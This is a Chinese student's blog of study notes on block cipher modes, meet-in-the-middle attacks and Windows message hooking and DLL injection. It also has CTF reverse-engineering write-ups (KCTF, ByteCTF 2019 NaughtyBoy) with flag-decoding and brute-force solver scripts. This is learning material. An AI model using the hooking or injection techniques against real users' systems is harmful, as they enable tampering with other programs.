

<!DOCTYPE html>
<html lang="zh-Hans" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/pisanbao.jpg">
  <link rel="icon" href="/img/pisanbao.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="皮三宝">
  <meta name="keywords" content="">
  
    <meta name="description" content="目前是准备采用有比赛时打比赛总结没比赛时看书学习理论的学习方法顺带把书中的大部分实验也给整了">
<meta property="og:type" content="article">
<meta property="og:title" content="大二上学习笔记">
<meta property="og:url" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="皮三宝のBlog">
<meta property="og:description" content="目前是准备采用有比赛时打比赛总结没比赛时看书学习理论的学习方法顺带把书中的大部分实验也给整了">
<meta property="og:locale">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/11.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/12.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/14.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6.jpg">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/9.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/15.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/16.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/17.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/18.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/19.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/22.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/23.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/24.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/25.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/26.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/27.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/28.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/29.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/21.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/30.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/31.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/32.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/33.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/34.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/35.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/36.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/37.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/38.png">
<meta property="og:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/39.png">
<meta property="article:published_time" content="2019-09-04T21:54:01.000Z">
<meta property="article:modified_time" content="2024-07-22T01:48:18.422Z">
<meta property="article:author" content="皮三宝">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://www.psbazx.com/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.png">
  
  
  
  <title>大二上学习笔记 - 皮三宝のBlog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.psbazx.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>pisanbao</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                主页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/1.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="大二上学习笔记"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2019-09-04 21:54" pubdate>
          September 4, 2019 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          76k wörter
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          636 minuten
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">大二上学习笔记</h1>
            
            
              <div class="markdown-body">
                
                <p>目前是准备采用有比赛时打比赛总结<br>没比赛时看书学习理论的学习方法<br>顺带把书中的大部分实验也给整了</p>
<a id="more"></a>

<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="分组密码加密操作模式"><a href="#分组密码加密操作模式" class="headerlink" title="分组密码加密操作模式"></a>分组密码加密操作模式</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><p>电子密码本模式加密<br>简答来说就是分组加密，不足则补<br>大腿出的17届面试题acdes就是<br>ecb加密模式一个缺点就是密钥不变每次加密出来的密文都是不变的<br>这样就可以通过流量分析和代换攻击<br>还有个就是位图的加密<br>即使加密了还是能从图中读出信息</p>
<h3 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h3><p>cbc密码分组链接模式<br>就是多了个iv<br>加密方法也有点改变<br>能使得每次加密出来的结果都不一样<br>加密方法是<br>第一个明文与iv xor后加密的y1<br>y1与第二个明文x2 xor<br>然后结果放去加密<br>然后再与下一次的明文xor<br>解密的话只需要多一步xor<br>如果每次加密都选择一个新iv这样每次的密文都会不一样</p>
<h3 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h3><p>输出反馈模式<br>目前遇到的密码学就这些，其余很少遇到特别在逆向中<br>等遇到了再来填坑把<br>开启一波技术性学习</p>
<p>10/15<br>我来了</p>
<h2 id="双重加密与中间人攻击"><a href="#双重加密与中间人攻击" class="headerlink" title="双重加密与中间人攻击"></a>双重加密与中间人攻击</h2><p>首先是密钥的不正确可能性<br>就是多解问题，比如用80位密钥加密分组宽度为64位明文<br>会出现2 64次方种密文<br>但是用的密钥有2 80次方个<br>所以会有多重映射关系<br>但是可以用多组明文密文对来测试可以大大减小错误密钥概率<br>还有就是双重加密之所以不安全是因为中间人攻击<br>理论上来说双重des加密如果通过暴力的话需要2 2k次方次测试密钥<br>但是中间人攻击可以使得复杂度变为单重des加密的倍数<br>主要实现就是先对明文一次加密打表<br>总共2 k次方<br>然后对密文解密然后比较查找 2 k次方<br>这样就是2 k+1次方次<br>所以说双重加密得不偿失<br>真正提升安全性还是三重加密</p>
<h2 id="三重加密-and-密钥漂白"><a href="#三重加密-and-密钥漂白" class="headerlink" title="三重加密 and 密钥漂白"></a>三重加密 and 密钥漂白</h2><p>三重加密最典型的就是ede模式<br>加密解密加密<br>之所以这样是可以实现单词加密<br>对抗差分分析也十分有效<br>密钥漂白对密钥位数不足但本身以足够抵抗差分分析<br>才会有很好的效果<br>具体是xor<br>给明文xor后加密<br>xor后输出</p>
<p>//填坑</p>
<h2 id="数学知识"><a href="#数学知识" class="headerlink" title="数学知识"></a>数学知识</h2><p>把之前的数学知识补充一下把<br>感觉re进阶数学不能落下</p>
<h1 id="逆向工程核心原理"><a href="#逆向工程核心原理" class="headerlink" title="逆向工程核心原理"></a>逆向工程核心原理</h1><h2 id="windows消息钩取"><a href="#windows消息钩取" class="headerlink" title="windows消息钩取"></a>windows消息钩取</h2><p>一说到钩取肯定是和hook有关<br>消息钩取的实现简单来说就是<br>当键盘发生输入事件时，消息会被添加到OS message queue<br>然后根据判断哪个程序发生事件，再从OS message queue取出消息添加到application message queue<br>hook的钩链则存在于他们之间，先于application message queue看到消息。这样就能进行很多操作<br>如修改，阻止。<br>具体实现是 SetWindowsHookEx()函数<br>有个示例程序貌似不兼容win10，一开就崩<br>明天用虚拟机跑下试试<br>果然虚拟机可以了 win7x86<br>稍微逆向了下，看书上的源码还是有点懵逼的。。。</p>
<h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>简介：对运行中的其他程序强行插入特定的dll文件</p>
<h1 id="KCTF"><a href="#KCTF" class="headerlink" title="KCTF"></a>KCTF</h1><h2 id="达芬奇密码"><a href="#达芬奇密码" class="headerlink" title="达芬奇密码"></a>达芬奇密码</h2><p>正式开始接触看雪ctf<br>感觉和其他ctf的区别还是挺大的<br>特别是对于数学的要求<br>经常出现逆出解不出的状况。。。<br><img src="10.png" srcset="/img/loading.gif" lazyload alt="10"><br>拖入ida后逻辑很简单，有个smc数据后memcpy<br>主要逻辑<br><img src="11.png" srcset="/img/loading.gif" lazyload alt="11"><br>首先是把输入与上面初始化的局部变量<br>逐个xor<br>然后开始平方<br>这边平方实现很奇葩看汇编看的<br>每个与最低位相乘后记录下值再与下一位加<br>连续循环8次<br><img src="12.png" srcset="/img/loading.gif" lazyload alt="12"><br>最后就是比较<br>就是x*<em>2 - 7</em>y**2 == 8<br>然后关键就是解方程了。。。<br>z3解不出。。。只好去学习一波sage<br>sage不能约束求解没办法<br><img src="14.png" srcset="/img/loading.gif" lazyload alt="14"><br>Mathematica<br>挺猛的<br>抽时间了解了解<br>最后写脚本就是多注意一个小端序问题</p>
<h2 id="丛林的秘密"><a href="#丛林的秘密" class="headerlink" title="丛林的秘密"></a>丛林的秘密</h2><p>题目是个apk，解压后分析so库<br>可以发现在动态解密一个html文件<br>里面调用了wasm<br>机器码复制出来反编译成c<br>这边填了个坑<br>一开始是用<br>./wasm2c 1.wasm -o 1.c<br>然后反编译时疯狂报错<br>后来经室友一起查看<br>发现是因为名称不能以数字打头<br>他会修改一些神奇的宏定义<br>改成./wasm2c 1.wasm -o a.c即可<br>仔细分析发现逻辑并不复杂</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">a = [<span class="hljs-number">83,48,109,51</span>,<span class="hljs-number">116,105,109,101</span>,<span class="hljs-number">95,108,49,116</span>,<span class="hljs-number">116,49,101,95</span>,<span class="hljs-number">99,48,100,101</span>,<span class="hljs-number">95,49,115,95</span>,<span class="hljs-number">117,115,51,102</span>,<span class="hljs-number">117,108,51,51</span>]<br>b = [<span class="hljs-number">0x18,0x9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>x6b,<span class="hljs-number">0</span>x1,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0x32,0x57</span>,<span class="hljs-number">0</span>x30,<span class="hljs-number">0</span>x5d,<span class="hljs-number">0x40,0x46</span>,<span class="hljs-number">0</span>x2b,<span class="hljs-number">0x46,0x56</span>,<span class="hljs-number">0</span>x3d,<span class="hljs-number">0x2,0x43</span>,<span class="hljs-number">0x17,0x0</span>,<span class="hljs-number">0x32,0x53</span>,<span class="hljs-number">0</span>x1f,<span class="hljs-number">0</span>x26,<span class="hljs-number">0</span>x2a,<span class="hljs-number">0x1,0x0</span>,<span class="hljs-number">0x10,0x10</span>,<span class="hljs-number">0</span>x1e,<span class="hljs-number">0x40,0x00</span>]<br>flag = &#x27;&#x27;<br>for i in range(len(a)):<br>    flag += chr(a[i]^b[i])<br>print flag<br></code></pre></td></tr></table></figure>
<h1 id="BYTECTF-2019"><a href="#BYTECTF-2019" class="headerlink" title="BYTECTF 2019"></a>BYTECTF 2019</h1><h2 id="NaughtyBoy"><a href="#NaughtyBoy" class="headerlink" title="NaughtyBoy"></a>NaughtyBoy</h2><p>apk逆向看了段时间<br>感觉不是一道太难的题目<br>来详细写下wp<br>//这边顺带夸一下不愧是r3得题，能学到好多<br>jeb里看不到什么，主要是看so库<br><img src="1.png" srcset="/img/loading.gif" lazyload alt="1"><br>可以看到比较开头字符串和花括号<br><img src="2.png" srcset="/img/loading.gif" lazyload alt="2"><br>下面这个其实就是单纯得长度验证，要为3得倍数<br>然后进如check函数<br>进check之前还有一个sub_400ADE函数是初始化<br>首先是初始化地图，复制粘贴一下打出来即可<br>注意一下里面的antidebug2函数<br>初始化了全局变量byte_5004 = 0;<br>这在最后验证时有用<br>下面来看下check<br>一开始会对前四个字节进行解密操作<br>然后开始游戏<br>其实是一个变种的推箱子游戏<br>具体规则是每三个输入为一次<br>前俩个输入是坐标<br>会检查你当前的坐标是否是O<br>第三个输入是行为<br>这边为检查你行为的那边是否为O<br>比如你输入1往上走就检查你上面是否为O<br>然后你的位置与你上面的O被清空成路线，你上上方向变为O，类似推箱子<br>这样再看看地图可以推出来初始位置必须是5,3<br>且必须往上走<br>这样就可以进行爆破</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs smali">unsigned char byte_500C[0x40] = &#123;0&#125;;<br><br>int __fastcall shift(int result)<br>&#123;<br>  char v1; // r2<br>  char v2; // r3<br>  char v3; // r12<br> <span class="hljs-built_in"> int </span>v4; // r1<br><br>  v1 = *(_BYTE *)(result + 1);<br>  v2 = *(_BYTE *)(result + 2);<br>  v3 = *(_BYTE *)(result + 3);<br>  *(_BYTE *)result ^= 0x87u;<br>  *(_BYTE *)(result + 1) = v1 ^ 0x42;<br>  *(_BYTE *)(result + 2) = v2 ^ 0x71;<br>  *(_BYTE *)(result + 3) = v3 ^ 0x48;<br>  v4 = *(_DWORD *)result ^ (*(_DWORD *)result &gt;&gt; 4) &amp; 0x3333333;<br>  *(_DWORD *)result = v4 ^ 2 * v4 &amp; 0xBEEFDEAC ^ ((v4 ^ 2 * v4 &amp; 0xBEEFDEAC) &gt;&gt; 15) &amp; 0x1BEEF;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br>int callfunc(unsigned __int8 *a1)<br>&#123;<br>   <span class="hljs-built_in"> return </span>shift((int)a1);<br>&#125;<br>int __fastcall sub_4008D0(int *a1)<br>&#123;<br> <span class="hljs-built_in"> int </span>v1; // r1<br> <span class="hljs-built_in"> int </span>v2; // r1<br><br>  v1 = *a1;<br> <span class="hljs-built_in"> if </span>( *a1 &lt;&lt; 31 )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( v1 &amp; 2 )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( v1 &amp; 4 )<br>      &#123;<br>       <span class="hljs-built_in"> if </span>( v1 &amp; 8 )<br>        &#123;<br>         <span class="hljs-built_in"> if </span>( v1 &amp; 0x10 )<br>          &#123;<br>           <span class="hljs-built_in"> if </span>( v1 &amp; 0x20 )<br>            &#123;<br>             <span class="hljs-built_in"> if </span>( v1 &amp; 0x40 )<br>                v2 = v1 &amp; 0xFFFFFF00 | 0x80;<br>              else<br>                v2 = v1 &amp; 0xFFFFFF80 | 0x40;<br>            &#125;<br>            else<br>            &#123;<br>              v2 = v1 &amp; 0xFFFFFFC0 | 0x20;<br>            &#125;<br>          &#125;<br>          else<br>          &#123;<br>            v2 = v1 &amp; 0xFFFFFFE0 | 0x10;<br>          &#125;<br>        &#125;<br>        else<br>        &#123;<br>          v2 = v1 &amp; 0xFFFFFFF0 | 8;<br>        &#125;<br>      &#125;<br>      else<br>      &#123;<br>        v2 = v1 &amp; 0xFFFFFFF8 | 4;<br>      &#125;<br>    &#125;<br>    else<br>    &#123;<br>      v2 = v1 &amp; 0xFFFFFFFC | 2;<br>    &#125;<br>  &#125;<br>  else<br>  &#123;<br>    v2 = v1 | 1;<br>  &#125;<br>  *a1 = v2;<br> <span class="hljs-built_in"> return </span>v2;<br>&#125;<br>int main()<br>&#123;<br>    unsigned char flag[4];<br>   <span class="hljs-built_in"> int </span>i;<br>    char temp1,temp2,temp3,temp4;<br>    for(temp1=32;temp1&lt;125;temp1++)<br>    &#123;<br><br>        for(temp2=32;temp2&lt;125;temp2++)<br>    &#123;<br><br>        for(temp3=32;temp3&lt;125;temp3++)<br>    &#123;<br>        for(temp4=32;temp4&lt;125;temp4++)<br>    &#123;<br>        flag[0] = temp1;<br>        flag[1] = temp2;<br>        flag[2] = temp3;<br>        flag[3] = temp4;<br>        callfunc(flag);<br>        if(flag[0]==52&amp;&amp;flag[1]==53&amp;&amp;flag[2]==49&amp;&amp;flag[3]==50)<br>        &#123;<br>            printf(<span class="hljs-string">&quot;%c%c%c%c\n&quot;</span>,temp1,temp2,temp3,temp4);<br>        &#125;<br><br>    &#125;<br><br>    &#125;<br><br>    &#125;<br><br>    &#125;<br>   <span class="hljs-built_in"> return </span>0;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>爆破出前四个为good<br>然后看下最终验证<br><img src="4.png" srcset="/img/loading.gif" lazyload alt="4"><br>就是检查第24位是否为O<br>那很简单了照这样走下去就行<br>最终flag<br>bytectf{good53233212414531}<br><img src="5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
